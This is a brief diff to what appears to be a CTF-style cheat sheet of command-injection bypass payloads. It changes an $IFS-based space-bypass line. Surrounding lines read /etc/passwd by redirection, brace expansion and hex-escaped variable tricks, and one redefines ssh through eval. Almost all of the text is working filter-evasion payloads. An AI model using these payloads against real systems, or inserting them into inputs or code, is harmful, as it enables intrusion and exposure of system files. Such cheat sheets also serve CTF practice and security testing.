@@ -223,7 +223,7 @@ eval 'ssh() { :; }'
 
 # jail
 # - https://github.com/w181496/Web-CTF-Cheatsheet#%E7%A9%BA%E7%99%BD%E7%B9%9E%E9%81%8E
-cat$IFS$2flag
+cat$IFS$*flag
 cat</etc/passwd
 {cat,/etc/passwd}
 X=$'cat\x20/etc/passwd'&&$X
